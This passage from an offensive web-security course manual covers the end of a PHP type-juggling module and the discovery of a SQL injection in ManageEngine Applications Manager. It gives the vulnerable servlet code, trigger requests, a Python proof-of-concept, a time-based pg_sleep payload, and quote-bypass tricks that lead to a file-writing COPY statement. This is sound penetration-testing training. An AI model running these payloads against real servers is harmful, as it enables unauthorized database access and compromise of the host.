Successfully recreate the type juggling attack described in this module. Note that your email is 
dependent on the account creation date, which implies that it is very unlikely to match the one 
used in this module. 
4.5.2.3 Extra Mile 
Given everything you have learned about type juggling, recreate the compromise of the “teacher” 
account using the “Forgot Password” function WITHOUT updating the email address. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
130 
4.6 Wrapping Up 
As we have been able to demonstrate in this module, type juggling vulnerabilities provide us with 
another attack vector for PHP applications that is more likely to get overlooked by developers 
than more commonly known techniques such as SQL injections. Nevertheless, given the right 
circumstances, these vulnerabilities can be just as powerful and we, as attackers, should always 
be looking out for the use of loose comparisons when reviewing PHP applications. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
131 
4.6.1.1.1 
 
5 ManageEngine Applications Manager 
AMUserResourcesSyncServlet SQL Injection RCE 
This module includes an in-depth analysis and exploitation of a SQL Injection vulnerability 
identified in the ManageEngine AMUserResourceSyncServlet servlet that can be used to gain 
access to the underlying operating system. The module will also discuss ways in which you can 
audit compiled Java servlets to detect similar critical vulnerabilities. 
5.1 Getting Started 
Revert the ManageEngine virtual machine from your student control panel. 
You will find the credentials to the ManageEngine Applications Manager server and application 
accounts in the Wiki. 
5.2 Vulnerability Discovery 
As described by the vendor,46 
ManageEngine Applications Manager is an application performance monitoring 
solution that proactively monitors business applications and help businesses 
ensure their revenue-critical applications meet end user expectations. 
Applications Manager offers out of the box monitoring support for 80+ 
applications and servers. 
One of the reasons we decided to look into the ManageEngine Application Manager was because 
we have encountered a number of ManageEngine applications over the course of our pentesting 
careers. Although the ManageEngine application portfolio has matured over the years, it is still a 
source of interesting vulnerabilities as we will demonstrate during this module. 
Whenever we start auditing an unfamiliar web application, we first need to familiarize ourselves 
with the target and learn about the exposed attack surface. In the case of ManageEngine’s 
Application Manager interface, we can see (Figure 97) that most URIs consist of the .do 
extension. A quick Google search leads us to a file extensions explanation page,47 which states 
that the .do extension is typically a URL mapping scheme for compiled Java code. 
 
Figure 97: Accessing the Administration panel of ManageEngine Applications Manager 
 
46 (Zoho Corp., 2020), https://www.manageengine.com/products/applications_manager/ 
47 (Sharpened Productions, 2020), https://fileinfo.com/extension/do 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
132 
5.2.1.1.1 
 
5.2.2 Servlet Mappings 
Given the extension explanation, we start by launching Process Explorer48 to gain additional 
insight into the Java process we are targeting: 
 
Figure 98: The ManageEngine Java target process 
A natural question at this point might be: how do we know which Java process to target? In this 
case, we are fortunate as there is only one Java process running on our vulnerable machine. 
Some applications use multiple Java process instances though. In such cases, we can check any 
given process properties in Process Explorer by right-clicking on the process name and choosing 
Properties (Figure 99). 
 
Figure 99: Checking out the properties of the Java.exe process, spawned by wrapper.exe 
In the Path location (Figure 99), we can see that the process uses a working directory of 
C:\Program Files\ManageEngine\AppManager12\working\. 
This confirms that we are on the right track. Furthermore, this directory is a good place to start 
looking for additional information regarding our target application. More specifically, Java web 
applications use a deployment descriptor file named web.xml to determine how URLs map to 
 
48 (MicroSoft, 2020), https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
133 
servlets,49 which URLs require authentication, and other information. This file is essential when 
we look for the implementations of any given functionality exposed by the web application. 
With that said, within the working directory, we see a WEB-INF folder, which is the Java’s default 
configuration folder path where we can find the web.xml file. This file contains a number of 
servlet names to servlet classes as well as the servlet name to URL mappings. Information like 
this will become useful once we know exactly which class we are targeting, since it will tell us 
how to reach it. 
5.2.3 Source Code Recovery 
Now that we have a better idea about this application and how it is laid out, we can start thinking 
about how to look for any potential vulnerabilities. In this case, we decided to first look for SQL 
injections. 
Although detecting any type of vulnerability is not an easy task, being able to review the 
application source code can definitely accelerate the process. As we already discovered from the 
initial review, at least some components of the ManageEngine Application Manager are written in 
Java. Fortunately, compiled Java classes can be easily decompiled using publicly available 
software. But we need to first identify which Java class or classes we want to review. 
By 
checking 
the 
contents 
of 
the 
C:\Program 
Files 
(x86)\ManageEngine\AppManager12\working\WEB-INF\lib directory, we notice that it contains a 
number of JAR files. If we just take a look at the names of these files, we can see that most of 
them are actually standard third party libraries such as struts.jar or xmlsec-1.3.0.jar. Only four JAR 
files 
in 
this 
directory 
appear 
to 
be 
native 
to 
ManageEngine. 
Of 
those 
four, 
AdventNetAppManagerWebClient.jar seems like a good starting candidate due to its rather self-
explanatory name. 
As already discussed at the beginning of the course, JAR files contain compiled Java classes and 
to recover the original Java source code from them we can make use of the JD-GUI decompiler. 
 
Figure 100: Decompiled AdventNetAppManagerWebClient.jar file 
 
49 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Java_servlet 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
134 
5.2.3.1.1 
 
Once we decompile our chosen JAR file, we notice that this is a rather substantial collection of 
Java classes. This means that we need to develop a methodology to make any sort of meaningful 
progress in our source code review. 
Before we do that, it is worth mentioning that, while JD-GUI is certainly an excellent decompiler, its 
search capabilities are not exactly the best. A better tool for this task would be Notepad++ which 
is already installed on our VM and could help us navigate this code base in a much easier way. In 
order to do that however, we first need to save the decompiled source code into human-readable 
.java files. JD-GUI allows us to do that via the File > Save All Sources menu. 
 
Figure 101: Extracting decompiled Java classes 
In Figure 101, we see that the extracted Java classes are saved in a compressed file. At this point, 
all we have left to do is decompress it and inspect the extracted files in Notepad++. 
5.2.4 Analyzing the Source Code 
Now that we have our tooling in place, it is time to actually start looking at the source code and 
trying to identify any vulnerabilities we could exploit. In a situation like this, we know that the 
target application is interacting with a database, so a natural instinct is to start reviewing all query 
strings we can find in the code. More specifically, we would try to identify all instances in which 
unsanitized user input could find its way into a query string and therefore lead to a typical SQL 
injection. 
While analyzing the code base we noticed that most query strings are assigned to a variable 
named query as shown in the listing below. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
135 
String query = "select count(*) from Alert where SEVERITY = " + i + " and groupname 
='AppManager'"; 
Listing 122 - An example query from the source code 
The query in Listing 122 is a great example we can use to build a regular expression on, which 
can help us find the vast majority of the specific type of queries we are interested in. Specifically, 
it contains a couple of key strings we want to look for, namely “query” and “select”, and also uses 
string concatenation using the “+” operator. 
Notepad++ allows us to perform searches using regular expressions and the one we will start 
with looks like the following: 
^.*?query.*?select.*? 
Listing 123 - Regular expression used to search for SELECT queries 
If you are not familiar with regular expressions, we strongly suggest you spend some time 
learning them as they can be a very useful tool in the vulnerability discovery process. For now, 
just know that the expression from Listing 123 basically says: 
• 
Look for any line that contains any number of alphanumeric characters at the beginning. 
• 
Which is followed by the string QUERY 
• 
Which is followed by any number of alphanumeric characters 
• 
Which is followed by the string SELECT 
• 
Which is followed by any number of alphanumeric characters 
While this may sound complicated, it really is not. 
Before we execute this search, we need to make sure that the Regular Expression option is 
checked in the Notepad++ search dialog and that the Directory text box is pointing to the directory 
on our desktop that contains the extracted Java source code file (Figure 102). 
 
Figure 102: Searching for SELECT queries 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
136 
5.2.4.1.1 
 
As we can see in Figure 102, this does not seem to narrow our area of focus much, since we find 
almost 5000 instances of SELECT queries in this JAR file alone. We may want to find a better way 
to search in order to reduce the number of instances we need to review. Keep in mind that there 
is nothing wrong with using the approach described above; however, we usually prefer to find a 
more reasonable starting point for the source code review. 
Another approach when reviewing a web application is to start from the front-end user interface 
implementation and take a look at the HTTP request handlers first. 
With that in mind, it is important to know that in a typical Java servlet, we can easily identify the 
HTTP request handler functions that handle each HTTP request type due to their constant and 
unique names. 
These methods are named as follows: 
• 
doGet 
• 
doPost 
• 
doPut 
• 
doDelete 
• 
doCopy 
• 
doOptions 
Since we already mentioned that we like to stay as close as possible to the entry points of user 
input into the application during the beginning stages of our source code audits, searching for all 
doGet and doPost function implementations seems like a good option. 
 
Figure 103: Locating all doGet() function implementations 
In the case of doGet, we only find 87 instances of the function implementation, which is a much 
more reasonable starting point. 
With a much smaller attack surface to review, we can start looking at every instance of the doGet 
implementation that processes user input before using it in a SQL query. This includes tracing 
user-input values through subsequent function calls that originated in the doGet functions as well. 
After spending some time using this methodology, we arrived at the doGet implementation of the 
AMUserResourcesSyncServlet class. 
Typically, the doPost and doGet functions expect two parameters as shown in the listing below: 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
137 
protected void doGet(HttpServletRequest req, 
                     HttpServletResponse resp) 
Listing 124 - Example of a servlet HTTP request handler method 
The first parameter is an HttpServletRequest50 object that contains the request a client has made 
to the web application, and the second one is an HttpServletResponse51 object that contains a 
response the servlet will send to the client after the request is processed. 
From the attacker point of view, we are particularly interested in the HttpServletRequest object, 
since that is what we can control. More specifically, we are interested in the servlet code that 
extracts HTTP request parameters through the getParameter or getParameterValues methods.52 
Now that we are familiar with how HTTP requests are processed in a Java servlet, let’s dive 
straight into the doPost and doGet methods in the AMUserResourcesSyncServlet class: 
18: public class AMUserResourcesSyncServlet 
19:   extends HttpServlet 
20: { 
21:   public void doPost(HttpServletRequest request, HttpServletResponse response) 
22:     throws ServletException, IOException 
23:   { 
24:     doGet(request, response); 
25:   } 
26:    
27:   public void doGet(HttpServletRequest request, HttpServletResponse response) 
throws ServletException, IOException 
28:   { 
29:     response.setContentType("text/html; charset=UTF-8"); 
30:     PrintWriter out = response.getWriter(); 
31:     String isSyncConfigtoUserMap = request.getParameter("isSyncConfigtoUserMap"); 
32:     if ((isSyncConfigtoUserMap != null) && ("true".equals(isSyncConfigtoUserMap))) 
33:     { 
34:       fetchAllConfigToUserMappingForMAS(out); 
35:       return; 
36:     } 
37:     String masRange = request.getParameter("ForMasRange"); 
38:     String userId = request.getParameter("userId"); 
39:     String chkRestrictedRole = request.getParameter("chkRestrictedRole"); 
40:     AMLog.debug("[AMUserResourcesSyncServlet::(doGet)] masRange : " + masRange + 
", userId : " + userId + " , chkRestrictedRole : " + chkRestrictedRole); 
41: 
42:     if ((chkRestrictedRole != null) && ("true".equals(chkRestrictedRole))) 
43:     { 
44:       boolean isRestricted = RestrictedUsersViewUtil.isRestrictedRole(userId); 
45:       out.println(isRestricted); 
46: 
47: 
48:     } 
49:     else if (masRange != null)  
        { 
 
50 (Oracle, 2015), https://docs.oracle.com/javaee/7/api/javax/servlet/http/HttpServletRequest.html 
51 (Oracle, 2015), https://docs.oracle.com/javaee/7/api/javax/servlet/http/HttpServletResponse.html 
52 (Oracle, 2015), https://docs.oracle.com/javaee/7/api/javax/servlet/ServletRequest.html#getParameter-java.lang.String 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
138 
50:       if ((userId != null) && (!"".equals(userId))) { 
52:         fetchUserResourcesofMASForUserId(userId, masRange, out); 
          } else { 
56:         fetchAllUserResourcesForMAS(masRange, out); 
57:       } 
58:     } 
Listing 125 - The source code listing of the doPost/doGet methods in the AMUserResourcesSyncServlet servlet 
First of all, in Listing 125 we can see that the doPost method simply redirects to the doGet. In 
servlet implementations this practice where multiple HTTP verbs are handled by a single method 
is quite common. 
In the doGet function, we can see on lines 31, 37, 38, and 39 that four different user-controlled 
parameters are retrieved from the HTTP request: isSyncConfigtoUserMap, ForMasRange, userId, 
and chkRestrictedRole. 
While we are in JD-GUI, we can make use of syntax highlighting. Any time we double-click a 
variable, JD-GUI will highlight all instances where that variable is used. If we try this feature on the 
userId variable we can see that, besides being used in the doGet function, userId is also used to 
build a SELECT query within the fetchUserResourcesofMASForUserId function (Figure 104). 
 
Figure 104: Syntax-tracing of the userId variable 
Let’s have a look at the fetchUserResourcesofMASForUserId implementation. 
66:   public void fetchUserResourcesofMASForUserId(String userId, String masRange, 
PrintWriter out) 
67:   { 
68:     int stRange = Integer.parseInt(masRange); 
69:     int endRange = stRange + EnterpriseUtil.RANGE; 
70:     String qry = "select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where 
USERID=" + userId + " and RESOURCEID >" + stRange + " and RESOURCEID < " + endRange; 
71:     AMLog.debug("[AMUserResourcesSyncServlet::(fetchUserResourcesofMASForUserId)] 
qry : " + qry); 
72:      
73:     ResultSet rs = null; 
74:     try 
75:     { 
76:       rs = AMConnectionPool.executeQueryStmt(qry); 
77:       while (rs.next()) 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
139 
78:       { 
79:         String resId = rs.getString(1); 
80:         out.println(resId); 
81:       } 
82:     } 
83:     catch (Exception ex) 
84:     { 
85:       ex.printStackTrace(); 
86:     } 
87:     finally 
88:     { 
89:       AMConnectionPool.closeStatement(rs); 
90:     } 
91:   } 
Listing 126 - The fetchUserResourcesofMASForUserId method 
In the previous listing we can see (line 70) that the userId variable is concatenated into the query 
string that is executed at line 76. This certainly looks like a SQL injection vulnerability! 
If we double-click on the fetchUserResourcesofMASForUserId function name in JD-GUI, we can 
also see that it is being called from the doGet function we started with on line 52 (Listing 125). 
Let’s see how we can arrive there and check if any sanitization is taking place. 
To do so, we need to concern ourselves with the first and second if statements, on lines 32 and 
42 respectively (Listing 125). Specifically, if they evaluate to TRUE, we would not be able to reach 
the else if on line 49 (Listing 125), which is what we are trying to do. We’ll get to this shortly. 
If we look at the aforementioned if statements, it is clear that we should be able to control the 
results of those statement evaluations as they depend on values that can be passed in a HTTP 
request. The key word here is “can.” Notice that in both cases, the first check is whether the 
respective variables are null. This means we simply have to make sure that in our future requests, 
those parameters are not set and we should fall through to our target statement. 
Speaking of which, the else if statement checks for the presence of the masRange variable (line 
49 Listing 125) and only moves on to the next if statement if the variable exists. Therefore, we 
need to make sure that our request has the ForMasRange parameter set (line 37 Listing 125). 
Finally, we arrive at the last if statement, which follows the same pattern: check for the presence 
of the userId variable (line 50 Listing 125) and make sure it is not an empty string. 
We have gone through this entire analysis to conclude that we should be able to reach the 
fetchUserResourcesofMASForUserId() function call without any sanitization of the userId variable. 
Furthermore, a quick look at Listing 126 shows that our variable is not sanitized within 
fetchUserResourcesofMASForUserId either, which means that we do indeed appear to have a 
valid SQL injection vulnerability on our hands. 
5.2.5 Enabling Database Logging 
Before we continue, let’s enable database logging. This can save us a lot of time while debugging 
applications, especially when we are dealing with possible SQL injection vulnerabilities. Although 
we already know what the query is, we need to see if any of our characters are transformed 
before they arrive at the database level. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
140 
Since ManageEngine uses PostgreSQL as a back end database, we will need to edit its 
configuration file in order to enable any logging feature. In our virtual machine, the postgresql.conf 
file 
is 
located 
at 
the 
following 
path: 
C:\Program 
Files 
(x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\postgresql.conf 
In order to instruct the database to log all SQL queries we’ll change the postgresql.conf 
log_statement setting to ‘all’ as shown in the listing below. 
log_statement = 'all'           # none, ddl, mod, all 
Listing 127 - Modifying the postgresql.conf file to enable query logging 
After changing the log file, we will need to restart the ManageEngine Applications Manager 
service to apply the new settings. We can do this by launching services.msc from the Run 
command window and finding the ManageEngine Applications Manager service (Figure 105). 
 
Figure 105: Restarting the ManageEngine Applications Manager service 
Once the service is restarted, we will be able to see failed queries in log files, beginning with 
swissql, in the following directory: 
C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\pgsql_log\ 
Listing 128 - PostgreSQL log directory 
For the duration of our exploit development, we will need to be able to execute SQL queries 
directly against the database for debugging purposes. 
One of the ways to do that is by using the pgAdmin software, which is installed on the 
ManageEngine virtual machine. This is a front end for PostgreSQL, the database used by the 
target application. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
141 
 
Figure 106: pgAdmin front end 
To run SQL queries against the pg_catalog database, load up pgAdmin and connect to the local 
ManageEngine server instance. 
Please refer to your course material in order to find the appropriate database credentials. 
In pgAdmin, we can execute any SQL statement through the Query Tool as shown in Figure 107 
and Figure 108. 
 
Figure 107: Using the pgAdmin Query Tool 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
142 
5.2.5.1.1 
 
 
Figure 108: Executing a SQL query through the Query Tool 
Alternatively, if you are more comfortable using the command line utility psql.exe, you can use 
that as well. Please note that the ManageEngine server instance is configured to listen on port 
15432. 
 
Figure 109: Using psql.exe to interact with the database 
5.2.6 Triggering the Vulnerability 
When available, analyzing the source code greatly accelerates vulnerability discovery and our 
understanding of any possible restrictions. Nevertheless, at some point we must trigger the 
vulnerability to make further progress. In order to do so, we need a URL to start crafting our 
request. 
From the servlet mapping initially discovered in the web.xml file, we know that the URL we need to 
use to reach the vulnerable code is as follows: 
<servlet-mapping> 
    <servlet-name>AMUserResourcesSyncServlet</servlet-name> 
    <url-pattern>/servlet/AMUserResourcesSyncServlet</url-pattern> 
</servlet-mapping> 
Listing 129 - The servlet mapping 
<servlet> 
    <servlet-name>AMUserResourcesSyncServlet</servlet-name> 
    <servlet-
class>com.adventnet.appmanager.servlets.comm.AMUserResourcesSyncServlet</servlet-
class> 
</servlet> 
Listing 130 - The mapping location 
Remember that during our analysis, we established that to reach the vulnerable SQL query, we 
only require two parameters in our request, namely ForMasRange and userId. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
143 
Putting all the information together, our initial request will look like this: 
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1; HTTP/1.1 
Host: manageengine:8443 
Listing 131 - Triggering the vulnerability 
Notice that the request above performs a basic injection using a semicolon. The reason for this is 
because we already know what the vulnerable query looks like (Listing 132) and we know that it 
does not contain any quoted strings. Therefore, trying to simply terminate the query with a 
semicolon at the injection point should work well. 
String qry = "select distinct(RESOURCEID) from AM_USERRESOURCESTABLE 
where USERID=" + userId + " and RESOURCEID >" + stRange + " and 
RESOURCEID < " + endRange; 
Listing 132 - The SQL query taken from the code. Notice how there are no quotes that need to be escaped. 
import sys 
import requests 
import urllib3 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 
 
def main(): 
    if len(sys.argv) != 2: 
        print "(+) usage %s <target>" % sys.argv[0] 
        print "(+) eg: %s target" % sys.argv[0] 
        sys.exit(1) 
     
    t = sys.argv[1] 
     
    sqli = ";" 
 
    r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t,  
                      params='ForMasRange=1&userId=1%s' % sqli, verify=False) 
    print r.text 
    print r.headers 
 
if __name__ == '__main__': 
    main() 
Listing 133 - Sample proof-of-concept to trigger the vulnerability 
When we send our trigger request through Burp or a simple Python script (Listing 133), we get a 
response that is not very verbose. As a matter of fact, it is virtually empty as indicated by the 
Content-Length of 0. 
HTTP/1.1 200 OK 
Server: Apache-Coyote/1.1 
Set-Cookie: JSESSIONID_APM_9090=5A0EF105FBA016EA342E8B6F20B8FB63; 
Path=/; Secure; HttpOnly 
Content-Type: text/html;charset=UTF-8 
Content-Length: 0 
Date: Sat, 26 Nov 2016 08:57:40 GMT 
Listing 134 - The HTTP response from the SQL Injection GET request 
This is worth noting because in the case of a black box test, we would almost have no way of 
knowing that an SQL injection vulnerability even exists. The HTTP server does not pass through 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
144 
any kind of verbose errors, any POST body changes, or 500 status codes. In other words, at first 
glance everything seems okay. 
Yet, when we look into the previously mentioned log file located in the C:\Program Files 
(x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\pgsql_log\ directory, we see an 
error message that is clearly indicative of an SQL injection: 
[ 2018-04-21 04:33:39.928 GMT ]:LOG:  execute <unnamed>: select distinct(RESOURCEID) 
from AM_USERRESOURCESTABLE where USERID=1 
[ 2018-04-21 04:33:39.929 GMT ]:ERROR:  syntax error at or near "and" at character 2 
[ 2018-04-21 04:33:39.929 GMT ]:STATEMENT:   and RESOURCEID >1 and RESOURCEID < 
10000001 
Listing 135 - The injected “;” character breaks The SQL query confirming the presence of a vulnerability 
Before we continue we need to provide a little but more detail about this particular vulnerability. In 
a brand new installation of our target web application, the data table that is used in the vulnerable 
query (AM_USERRESOURCESTABLE) does not contain any data. When this is true, it can lead to 
misleading or incomplete results if we only try injecting trivial payloads. Let’s see why that is. 
If we pay close attention, we can see that we have a few options for the type of payload we can 
inject. One approach would be to use a UNION query and extract data directly from the database. 
However, we need to be mindful of the fact that the RESOURCEID column that the original query is 
referencing, is defined as a BIGINT datatype. In other words, we could only extract arbitrary data 
when it is of the same data type. 
select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1 UNION SELECT 1 
Listing 136 - A simple UNION injection payload 
Another option is to use a UNION query with a boolean-based blind injection. Similar to what we 
have already seen in ATutor, we could construct the injected queries to ask a series of TRUE and 
FALSE questions and infer the data we are trying to extract in that fashion. 
select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1 UNION SELECT 
CASE WHEN (SELECT 1)=1 THEN 1 ELSE 0 END 
Listing 137 - An injection payload using UNION and a boolean conditional statement 
The reason why we are not considering this approach is because one of the great things about 
Postgres SQL-injection attacks is that they allow an attacker to perform stacked queries. This 
means that we can use a query terminator character in our payload, as we saw in Listing 131, and 
inject a completely new query into the original vulnerable query string. This makes exploitation 
much easier since neither the injection point nor the payload are limited by the nature of the 
vulnerable query. 
The downside with stacked queries is that they return multiple result sets. This can break the 
logic of the application and with it the ability to exfiltrate data with a boolean blind-based attack. 
Unfortunately, this is exactly what happens with our ManageEngine application. An example error 
message 
from 
the 
application 
logs 
(C:\Program 
Files 
(x86)\ManageEngine\AppManager12\logs\stdout.txt) when using stacked queries can be seen 
below. 
[30 Nov 2018 07:40:23:556] SYS_OUT: AMConnectionPool : Error while executing query 
select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1;SELECT (CASE 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
145 
WHEN (1=1) THEN 1 ELSE 0 END)-- and RESOURCEID >1 and RESOURCEID < 10000001. Error 
Message : Multiple ResultSets were returned by the query. 
Listing 138 - Using stacked queries with boolean-based payloads results in the breakdown of application logic 
In order to solve this problem and still be able to use the flexibility of stacked queries, we have to 
resort to time-based blind injection payloads. 
In the case of PostgreSQL, to confirm the blind injection we would use the pg_sleep function, as 
shown in the listing below. 
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1; 
select+pg_sleep(10); HTTP/1.1 
Host: manageengine:8443 
Listing 139 - Causing the database to sleep for 10 seconds before returning 
Note that the plus sign between select and pg_sleep will be interpreted as a space. This could also 
be substituted with the “%20” characters, which are the URL-encoded equivalent of a space. 
Now that we have verified our ability to execute stacked queries along with time-based blind 
injection, we can continue our exploit development. 
5.2.6.1 Exercises 
1. 
Improve the regex used earlier to locate all the SELECT SQL queries in the code base in order 
to limit the results to only those which include string concatenation and a WHERE clause. 
2. 
Recreate the pg_sleep injection as described in the previous section. 
3. 
Experiment with different payloads and try to discover if there are any character limitations 
for the injected payloads. 
5.3 How Houdini Escapes 
As we previously stated, our ability to use stacked queries in the payload is very powerful. 
However, after testing various payloads, specifically those that include quoted strings, we noticed 
something strange. Let’s take a look at the following simple example in which we inject a single 
quote in the query: 
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1' HTTP/1.1 
Host: manageengine:8443 
Listing 140 - Sending an SQL Injection payload that contains a single quote 
Looking at the log file we see the following error: 
[ 2018-04-21 04:42:58.221 GMT ]:ERROR:  operator does not exist: integer &# integer at 
character 73 
[ 2018-04-21 04:42:58.221 GMT ]:HINT:  No operator matches the given name and argument 
type(s). You might need to add explicit type casts. 
[ 2018-04-21 04:42:58.221 GMT ]:STATEMENT:  select distinct(RESOURCEID) from 
AM_USERRESOURCESTABLE where USERID=1&#39 
Listing 141 - The SQL error message in the log file 
As it turns out, special characters are HTML-encoded before they are sent to the database for 
further processing. This causes us a few headaches as it seems that we cannot use quoted string 
values in our queries. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
146 
In MySQL, this could be solved easily. For example, the following two select statements are 
equally valid: 
MariaDB [mysql]> select concat('1337',' h@x0r') 
    -> ; 
+-------------------------+ 
| concat('1337',' h@x0r') | 
+-------------------------+ 
| 1337 h@x0r              | 
+-------------------------+ 
1 row in set (0.00 sec) 
 
MariaDB [mysql]> select concat(0x31333337,0x206840783072) 
    -> ; 
+-----------------------------------+ 
| concat(0x31333337,0x206840783072) | 
+-----------------------------------+ 
| 1337 h@x0r                        | 
+-----------------------------------+ 
1 row in set (0.00 sec) 
Listing 142 - MySQL syntax that automatically decodes a string value from ASCII hex 
As shown in the listing above, the ASCII characters in their hexadecimal representation are 
automatically decoded by the MySQL engine. 
Unfortunately, this feature is not present in PostgreSQL. Moreover, upon of a review of the 
PostgreSQL documentation for string manipulation functions,53 we noticed that most functions 
used for encoding and decoding of various data formats such as hex or base64 make use of 
quotes. 
As an example, the listing below shows how to make use of the decode function in PostgreSQL to 
convert our “AWAE” base64 encoded string: 
select convert_from(decode('QVdBRQ==', 'base64'), 'utf-8'); 
Listing 143 - Using the decode function in PostgreSQL. Note: we still need quotes! 
 
Figure 110: Testing out the decode function 
 
53 (The PostgreSQL Global Development Group, 2020), https://www.postgresql.org/docs/9.2/static/functions-string.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
147 
5.3.1.1.1 
 
5.3.2 Using CHR and String Concatenation 
One of the ways in which we can bypass the quotes restriction is to use the CHR54 and 
concatenation syntax. For example, in most situations, we can select individual characters using 
their code points55 (numbers that represent characters) and concatenate them together using the 
double pipe (||) operator. 
amdb=#SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69); 
 ?column? 
---------- 
 AWAE 
(1 row) 
Listing 144 - Using the char function to avoid quotes 
The problem is that character concatenation only works for basic queries such as SELECT, 
INSERT, DELETE, etc. It does not work for all SQL statements. 
amdb=# CREATE TABLE AWAE (offsec text); INSERT INTO AWAE(offsec) VALUES 
(CHR(65)||CHR(87)||CHR(65)||CHR(69)); 
CREATE TABLE 
INSERT 0 1 
amdb=# SELECT * from AWAE; 
 offsec 
-------- 
 AWAE 
(1 row) 
Listing 145 - This is valid syntax 
In the example above, the SQL statement creates a table called “AWAE” containing a single 
column of text and successfully inserts a record into it. However, if we try to execute a function, 
the query will fail. For example, here is the COPY function using CHR to write to a file: 
CREATE TABLE AWAE (offsec text); 
INSERT INTO AWAE(offsec) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69)); 
COPY AWAE (offsec) TO 
CHR(99)||CHR(58)||CHR(92)||CHR(92)||CHR(65)||CHR(87)||CHR(65)||CHR(69)); 
ERROR:  syntax error at or near "CHR" 
LINE 3: COPY AWAE (offsec) TO CHR(99)||CHR(58)||CHR(92)||CHR(92)||CH... 
                              ^ 
 
********** Error ********** 
Listing 146 - Failing at writing to the target file c:\\AWAE using the CHR function 
While the CHR function can be very helpful while dealing with non-printable characters, we need 
to find a better way to bypass the quotes restrictions for those situations where we need to make 
use of PostgreSQL functions such as COPY. 
 
54 (The PostgreSQL Global Development Group, 2020), https://www.postgresql.org/docs/9.1/static/functions-string.html 
55 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Code_point 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
148 
5.3.3 It Makes Lexical Sense 
After spending some time reading the PostgreSQL documentation related to Lexical Structure,56 
we noticed that PostgreSQL syntax also supports dollar-quoted string constants. Their purpose is 
to make it easier to read statements that contain strings with literal quotes. 
Essentially, two dollar characters ($$) can be used as a quote (’) substitute by themselves, or a 
single one ($) can indicate the beginning of a “tag.” The tag is optional, can contain zero or more 
characters, and is terminated with a matching dollar ($). If used, this tag is then required at the 
end of the string as well. 
As a result, the following syntax examples produce the exact same result in PostgreSQL: 
SELECT 'AWAE'; 
SELECT $$AWAE$$; 
SELECT $TAG$AWAE$TAG$; 
Listing 147 - Using dollar-quoted string constants. Notice the use of the optional tag called TAG in the third SQL 
statement 
This allows us to fully bypass the quotes restriction we have previously encountered as shown in 
the listing below. 
CREATE TEMP TABLE AWAE(offsec text);INSERT INTO AWAE(offsec) VALUES ($$test$$); 
COPY AWAE(offsec) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$; 
 
COPY 1 
 
Query returned successfully in 201 msec. 
Listing 148 - Using dollar-quoted string constants to bypass quotes restrictions 
